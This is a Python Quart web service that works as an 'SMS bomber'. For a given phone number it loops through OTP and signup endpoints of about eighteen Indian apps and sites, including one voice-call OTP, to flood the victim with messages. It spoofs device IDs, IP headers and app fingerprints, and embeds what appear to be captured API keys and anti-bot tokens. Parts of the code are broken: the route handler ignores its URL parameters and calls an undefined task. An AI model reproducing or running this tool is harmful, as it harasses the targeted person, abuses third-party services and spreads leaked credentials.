from quart import Quart, jsonify, request
import requests, random, string, uuid, json

app = Quart(__name__)

@app.route('/api/user/<num>/<int:limit>', methods=['GET'])
async def process_request():
    asyncio.create_task(background_task())
    
    return jsonify({"status": "Processing started"}), 200

def generate_uuid_and_sign_in(num, limit):
    if limit <= 0:
        return jsonify({'error': 'Limit must be greater than zero'}), 400

    if not num:
        return jsonify({'error': 'Mobile number is required'}), 400

    responses = []

    uuid_response = str(uuid.uuid4())
    responses.append({'uuid': uuid_response})

    for _ in range(limit):

        random_ip = generate_random_ip()

        url = "https://api.dream11.com/auth/passwordless/init"
        data = {
            "phoneNumber": f"{num}",
            "channel": "sms"
        }
        headers = {
            "a1": "T9oSmMvfsVPRiXo+qmWFr3fUPhnzFlUFZ5IKI2Dvm+ANybdlejtaC+7MZ69s6mkV25si46bw/8aI1YcMlAzcRAjof+WxYXOqYaBzJQawgVGs9Hy+/xeXQdmCeb+p+eTUCuGPSGwpPBc6LgFF0zjb5O+ebTy4WiDG03EeGNj2ZVbbvfedbTmzUbt8XzmVwOef",
            "Accept": "application/json",
            "Accept-Encoding": "gzip",
            "app_version": "5.29.1",
            "codepush_version": "",
            "Connection": "Keep-Alive",
            "Content-Length": "44", 
            "Content-Type": "application/json",
            "device": "androidplaystore",
            "deviceid": "e274c6d7df441ded",
            "ek1": "N7FStNLRUgZEyqvZckmacw==",
            "ek2": "T9oSmMvfsVPRiXo+qmWFr+f3IMF1L3fMQtB0JiLya/o=",
            "guest-id": "e731a386-e7ca-422c-907b-86ac8b6f2a30",
            "Host": "api.dream11.com",
            "locale": "en-US",
            "siteid": "1",
            "user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
            "version": "1451"
        }
        response = requests.post(url, json=data, headers=headers)
        responses.append({'Dream11': response.text})
        ##2nd
        url1 = "https://api.olx.in/v2/auth/authenticate"
        headers1 = {
            'X-acf-sensor-data': '2,a,V92+LTtfNz6sUOK8r1eZqFhN5UiDOdrnOy772zwaUUtiZL3enp3OA4qJ2vW/atMZXXiXas7eUcirPad1JI9XKGnHP978bzDaPEV1lIEGMxDUtXbsoWU+9ti9QaTliRbcaSeaoB6uA5Es2NWOxddJQR8iUGn/TMc8I5gPB/36Tzw=,SOEyrqOOx/8cVA0zGeLOAvxv/PkBOjODjiRUpjej1ZdADg7PqO65wtYGD+dswai2PFGRwaXVMe5gyOE3po0GTS9QZ9dRJlHQyufhS8XRTuDfx7WuOoowSkNcVIIua0hS+fAl8XFhmUqE9Dxvf58EY5JfJHKl9B9GpOlBiZHNIes=$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$21000,0,0$$',
            'X-Panamera-fingerprint': 'ad0ce46faff2cd5f',
            'User-Agent': 'android 19.07.000 olxin',
            'x-origin-panamera': 'Production',
            'Content-Type': 'application/json; charset=UTF-8',
            'Content-Length': '61',
            'Host': 'api.olx.in',
            'Connection': 'Keep-Alive'
        }
        data1 = {
          "grantType": "phone",
          "language": "en",
          "phone": f"+91{num}"
        }
        response1 = requests.post(url1, data=json.dumps(data1), headers=headers1)
        responses.append({'olex': response1.text})
        
        url2 = "https://node2.licious.in/api/v2/otp-signup"
        headers2 = {
            "ab_identifier": generate_random_string(),
            "Accept-Encoding": "gzip",
            "app-version": "282",
            "app-version-name": "8.33.0",
            "appsflyerId": f"{random.randint(1000000000000, 9999999999999)}-{random.randint(10000000000000000000, 99999999999999999999)}",
            "auth-mode": "v2",
            "cityid": str(random.randint(1, 100)),
            "Connection": "Keep-Alive",
            "Content-Length": "69", 
            "Content-Type": "application/json; charset=UTF-8",
            "customer_key": generate_random_string(),
            "customerkey": generate_random_string(),
            "deviceid": generate_random_string(16),
            "Host": "node2.licious.in",
            "hub_id": str(random.randint(1, 50)),
            "hubid": str(random.randint(1, 50)),
            "kml_id": generate_random_string(16),
            "lat": f"{random.uniform(20.0, 30.0):.5f}",
            "lng": f"{random.uniform(70.0, 80.0):.5f}",
            "macid": generate_random_string(12),
            "source": "android",
            "theme-id": generate_random_string(16),
            "token": generate_random_string(),
            "User-Agent": "okhttp/4.9.2"
        }
        
        data2 = {
            "customer_key": generate_random_string(),
            "phone": f"{num}",
            "captcha_token": ""
        }
        response2 = requests.post(url2, headers=headers2, json=data2)
        responses.append({'Licuous': response2.text})
        
        headers3 = {
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Length": "96",
            "Content-Type": "application/json; charset=UTF-8",
            "Device-Id": generate_random_device_id(),
            "Host": "api.unacademy.com",
            "User-Agent": "UnacademyLearningAppAndroid/6.133.0 Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
            "X-APP-BUILD-VERSION": "6.133.0",
            "X-APP-VERSION": "197150",
            "X-PLATFORM": "5",
            "X-SCREEN-NAME": "Login_-_Signup"
        }
        payload3 = {
            "country_code": "IN",
            "phone": f"{num}",
            "send_otp": True,
            "otp_type": 1,
            "app_hash": "uI6w7mnt583"
        }
        response3 = requests.post("https://api.unacademy.com/v3/user/user_check/?enable-email=true", headers=headers3, json=payload3)
        responses.append({'Uncademy': response3.text})
        
        random_udid = generate_random_string(16)
        random_gcm_reg_id = generate_random_string(16) + ":APA91" + generate_random_string(40)
        random_aid = generate_uuid()
        
        payload4 = {
            "app_version": "7.10.51",
            "aaid": f"{random_aid}",
            "course": "",
            "phone_number": f"{num}",
            "language": "en",
            "udid": f"{random_udid}",
            "class": "",
            "gcm_reg_id": f"{random_gcm_reg_id}"
        }
        
        headers4 = {
            "android_sdk_version": "28",
            "Connection": "Keep-Alive",
            "Content-Length": "343",
            "Content-Type": "application/json; charset=utf-8",
            "device_model": "G011A",
            "has_upi": "false",
            "Host": "api.doubtnut.com",
            "User-Agent": "okhttp/5.0.0-alpha.2",
            "version_code": "1160"
        }
        response4 = requests.post("https://api.doubtnut.com/v4/student/login", headers=headers4, json=payload4)
        responses.append({'Doubtnut': response4.text})
        
        random_udid = str(uuid.uuid4()).replace('-', '')[:16]
        random_uniqueId = generate_random_string(16)
        random_session_token = str(uuid.uuid4())
        
        headers5 = {
            "Accept-Encoding": "gzip",
            "Accept-Language": "en",
            "api_key": "valyoo123",
            "appversion": "4.4.2 (240803001)",
            "brand": "google",
            "Connection": "Keep-Alive",
            "Content-Length": "44",
            "Content-Type": "application/json",
            "Host": "api-gateway.juno.lenskart.com",
            "model": "G011A",
            "udid": random_udid,
            "uniqueId": random_uniqueId,
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
            "x-accept-language": "en",
            "x-api-client": "android",
            "x-app-version": "4.4.2 (240803001)",
            "X-B3-TraceId": "1723365107360",
            "X-Build-Version": "240803001",
            "x-country-code": "IN",
            "x-country-code-override": "IN",
            "x-session-token": "deb488c3-2fba-4e00-a57b-405fddb9e9d8"
        }
        payload5 = {
            "phoneCode": "+91",
            "telephone": f"{num}"
        }
        response5 = requests.post("https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", json=payload5, headers=headers5)
        responses.append({'Lenskart': response5.text})
        
        url6 = f"https://api.healthkart.com/api/user/validate/1/{num}/signup?plt=3&st=1"
        headers6 = {
            "Accept": "application/json", 
        }
        response6 = requests.get(url6, headers=headers6)
        responses.append({'Healthkart': response6.text})
        
        headers7 = {
            "Accept-Encoding": "gzip",
            "Accept-Language": "en",
            "Android-Version": "28",
            "App-Version": "790",
            "Connection": "Keep-Alive",
            "Content-Length": "78",  
            "Content-Type": "application/json; charset=UTF-8",
            "Device-UUID": "",  
            "Host": "api.blackbuck.com",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
            "x-aaa-enabled": "true",
            "X-B3-Sampled": "1",
            "X-B3-SpanId": generate_random_string(),
            "X-B3-TraceId": generate_random_string(),
            "X-Consumer-Tenant-Id": "boss",
            "x-device-id": generate_random_device_id(16),
            "X-Forwarded-For": random_ip,
            "X-SOURCE-ID": "com.zinka.boss"
        }
        
        data7 = {
            "channel": "OTP",
            "phone_number": f"{num}", 
            "method": "SMS",
            "tenant": "SUPPLY"
        }
        
        response7 = requests.post("https://api.blackbuck.com/supplywrapper/sessions/login", headers=headers7, json=data7)
        responses.append({'Blackbuck': response7.text})
        
        data8 = {
            "country": "+91",
            "contact": f"{num}", 
            "companyId": 1000,
            "deviceId": "msm8998",
            "deviceKey": "tuOTBO4KI4anmXr1dnL2bE3PkGPdsAmI7WScyMHeP62LYkKhxDpd9JMtAaAi7dK7",
            "cartId": "66b8a0e09e76ea574d6fb27d"
        }
        headers8 = {
            "accept": "application/json",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Length": "193", 
            "Content-Type": "application/json",
            "devicekey": "tuOTBO4KI4anmXr1dnL2bE3PkGPdsAmI7WScyMHeP62LYkKhxDpd9JMtAaAi7dK7",
            "Host": "app.chaayos.com",
            "User-Agent": "okhttp/4.9.2"
        }
        response8 = requests.post("https://app.chaayos.com/app-crm/v2/crm/lkp/1000", headers=headers8, json=data8)
        responses.append({'chaayos': response8.text})
        
        data9 = {
            "cleverTapUserId": "__ge731a386e7ca422c907b86ac8b6f2a30",
            "controlGroup": "B",
            "deviceToken": "",
            "mobile": f"{num}", 
            "prd": "ANDR",
            "pushToken": ""
        }
        
        headers9 = {
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Length": "143", 
            "Content-Type": "application/json; charset=UTF-8",
            "Host": "www.abhibus.com",
            "IMEI": generate_random_device_id(16),
            "User-Agent": "okhttp/4.12.0"
        }
        
        response9 = requests.post("https://www.abhibus.com/app/v83/sendOtp", headers=headers9, json=data9)
        responses.append({'abhibus': response9.text})
        
        data10 = {
            "mobile": f"{num}"
        }
        headers10 = {
            "accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip",
            "authorization": "VVaw0Sf29U5TijBb3aq2sCdjMQ1Kk8w4",
            "Connection": "Keep-Alive",
            "Content-Length": "23",
            "Content-Type": "application/json",
            "Host": "www.tractorjunction.com",
            "User-Agent": "okhttp/4.9.1"
        }
        response10 = requests.post("https://www.tractorjunction.com/api/v3/en/user/login/send-otp/", headers=headers10, json=data10)
        responses.append({'Tractorjunction': response10.text})
        #number = f"91{num}"
        data11 = {
            "phone": int(num),  
            "realm": "pa"
        }
        
        headers11 = {
            "accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip",
            "build-version": "1.13.1-b654",
            "Connection": "Keep-Alive",
            "Content-Length": "35", 
            "Content-Type": "application/json;charset=utf-8",
            "Host": "network.mfine.co",
            "platform": "android",
            "User-Agent": "okhttp/4.2.1",
            "x-device-id": generate_random_device_id(16),
            "x-mclient-id": "PA",
            "x-secret-key": "dEn3iQDYLnoZvXxbFw2dRIEXsg9v0B95ziKQgI8zEh6oQyaSX85siSFWsLM3C2vk",
            "x-user-tz": "Asia/Shanghai"
        }
        response11 = requests.post("https://network.mfine.co/api/userservice/PhoneOTPs/createSignupOTP", headers=headers11, json=data11)
        responses.append({'Mfine': response11.text})
        
        headers12 = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Length": "29",
            "Content-Type": "application/json",
            "Host": "cf.citymall.live",
            "use-applinks": "true",
            "User-Agent": "okhttp/4.9.2",
            "x-app-name": "CX",
            "x-app-package": "live.citymall.customer.prod",
            "x-app-path": "/data/user/0/live.citymall.customer.prod",
            "x-app-version": "1.39.4",
            "x-app-version-code": "216",
            "x-app-version-cp": "1.39.4-cms-v2",
            "x-ios-app-code": "5",
            "x-platform-os": "android",
        }
        
        data12 = {
            "phone_number": f"{num}"
        }
        
        response12 = requests.post("https://cf.citymall.live/api/cl-user/auth/get-otp", headers=headers12, data=json.dumps(data12))
        responses.append({'citymall': response12.text})
        
        
        headers13 = {
            "accept": "application/json, text/plain, */*",
            "Connection": "Keep-Alive",
            "Content-Type": "application/json",
            "User-Agent": "okhttp/4.9.2"
        }
        
        payload13 = {
            "mobile": f"{num}",
            "source": "APP",
            "fcmToken": None
        }
        
        response13 = requests.post("https://appapi.zoopindia.in/v2/customers/login", headers=headers13, data=json.dumps(payload13))
        responses.append({'Zoop': response13.text})
        
        deviceid1 = str(uuid.uuid4()).replace("-", "")[:16] 
        mcid = str(uuid.uuid4()).replace("-", "")  
        tid = "AI_" + deviceid1 
        mDeviceId = str(uuid.uuid4())  
        
        headers14 = {
            "Accept": "application/json",
            "Accept-Encoding": "gzip",
            "Accept-Language": "en",
            "Authorization": "skBx9JFP2MYKYxP",
            "Connection": "Keep-Alive",
            "Content-Type": "application/json; charset=utf-8",
            "currency": "inr",
            "deviceid": deviceid1,
            "Host": "userservice.makemytrip.com",
            "language": "eng",
            "mcid": mcid,
            "org": "mmt",
            "os": "Android 9",
            "pemail": "",
            "region": "in",
            "tid": tid,
            "User-Agent": "MakeMyTrip/9.3.1 (Android 9; Build/PI)",
            "user-identifier": json.dumps({
                "appVersion": "9.3.1",
                "deviceId": deviceid1,
                "mDeviceId": mDeviceId,
                "os": "Android",
                "osVersion": "9",
                "timeZone": "+8",
                "type": "mmt-auth"
            }),
            "ver": "9.3.1",
            "vid": "vid",
        }
        
        payload14 = {
            "appHashKey": "Fkkno1xnYMa",
            "channel": ["MOBILE"],
            "countryCode": "91",
            "isEncoded": False,
            "loginId": f"{num}",
            "type": 8
        }
        
        response14 = requests.post("https://userservice.makemytrip.com/ext/Android/9.3.1/send/token/SIGNUP_OTP?idContext=B2C&flavour=Android&profile=B2C&currency=inr&language=eng&region=in&versioncode=927&brand=MMT", headers=headers14, json=payload14)
        responses.append({'Makemytrip': response14.text})
        
        x_request_tracker = str(uuid.uuid4())
        
        headers15 = {
            "Accept": "application/json",
            "Accept-Encoding": "gzip",
            "APPVERSION-GOIBIBO": "2070",
            "Authorization": "PTYDkbIGhEsDPDy",
            "Connection": "Keep-Alive",
            "Content-Type": "application/json; charset=utf-8",
            "currency": "inr",
            "DEVICE-ID": deviceid1,
            "deviceId": deviceid1,
            "DEVICEINFO-GOIBIBO": "google-G011A",
            "flavour": "android",
            "Host": "userservice.goibibo.com",
            "language": "eng",
            "MOBILE-SESSION-ID": "1",
            "region": "IN",
            "User-Agent": "Goibibo/18.1.3 (Android 9; G011A Build/PI)",
            "user-identifier": json.dumps({
                "type": "auth",
                "profileType": "0",
                "timeZone": "GMT+08:00",
                "deviceId": deviceid1,
                "os": "Android",
                "appVersion": "2070",
                "value": "",
                "deviceOrBrowserInfo": "Google-G011A"
            }),
            "X-GO-FLAVOR": "android",
            "x-request-tracker": x_request_tracker,
        }
        
        payload15 = {
            "loginId": f"{num}",
            "countryCode": "91",
            "channel": ["MOBILE"],
            "appHashKey": "aA7YXnBciKU"
        }
        
        response15 = requests.post("https://userservice.goibibo.com/ext/Android/2070/send/token/OTP_IS_REG?flavour=android", headers=headers15, json=payload15)
        responses.append({'Gobibo': response15.text})
        
        url16 = f"https://capi.redbus.com/api/User/v1/SendOtp?whatsAppOptIn=false&mobile={num}&phoneCode=%2B91&retryAttempt=0"
        
        mri_session_id = "AMfa774b93-850f-3942-b7e1-e3ad3ee47b1a_AMfa774b93-850f-3942-b7e1-e3ad3ee47b1b"
        pigeon_did = str(uuid.uuid4())  
        
        headers16 = {
            "Accept": "application/json",
            "Accept-Encoding": "gzip",
            "appversion": "23.1.0",
            "AppVersionCode": "231000",
            "auth_key": "487a342c-92f1-41ae-81fa-aaa5120f6bb3",
            "auth_token": "57:3B:F6:F7:E1:54:05:34:A5:64:8E:FF:D2:65:6C:44:B6:12:BB:DC",
            "BusinessUnit": "BUS",
            "Channel_Name": "MOBILE_APP",
            "Connection": "Keep-Alive",
            "Content-Type": "application/json",
            "Country": "India",
            "Country_Name": "IND",
            "Currency": "INR",
            "DeviceId": deviceid1,
            "ExpVariantName": "Google_Aid",
            "Google_Aid": "e731a386-e7ca-422c-907b-86ac8b6f2a30",
            "Host": "capi.redbus.com",
            "Language": "en",
            "MriSessionId": mri_session_id,
            "os": "Android",
            "OSVersion": "9",
            "PigeonDID": pigeon_did,
            "regid": "e6n_7Z7gTf6PIBFnuuzPI1:APA91bEa4z9PfWl8Auq0TkDvD3SEb2ghXs-8P5wenH_ZEeZveWA255Ev4GDbConvw9IVGcnHL7kF136yFnGe1i8kDNUamYBkf7Zgqs_A7935sEcE2t4tV2VFi18_i5Mqd1Ha8LN51pUZ",
            "SelectedCurrency": "INR",
            "User-Agent": "okhttp/4.11.0",
            "UserType": "GUEST",
        }
        
        response16 = requests.get(url16, headers=headers16)
        
        responses.append({'Redbus': response16.status_code})
        
        params17 = {
            'mobile': int(num),
            'country_code': '+91'
        }
        response17 = requests.get("https://api.mydukaan.io/api/account/seller/sign-in/", params=params17)
        responses.append({'mydukaan': response17.text})
        
        headers18 = {
            "android_sdk_version": "28",
            "Connection": "Keep-Alive",
            "Content-Length": "36",
            "Content-Type": "application/json; charset=utf-8",
            "device_model": "G011A",
            "has_upi": "true",
            "Host": "micro.doubtnut.com",
            "User-Agent": "okhttp/5.0.0-alpha.2",
            "version_code": "1160"
        }
        
        payload18 = {
            "phone": f"{num}",
            "locale": "en"
        }
        
        response18 = requests.post("https://micro.doubtnut.com/otp/send-call", headers=headers18, json=payload18)
        responses.append({'Call': response18.text})

    
    return jsonify({'status': 'success', 'message': 'Bomber Started.'}), 200


def generate_uuid():
    return str(uuid.uuid4())
    
def generate_random_string(length=16):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
def generate_random_device_id(length=40):
    return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=length))

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

if __name__ == '__main__':
    app.run(debug=True)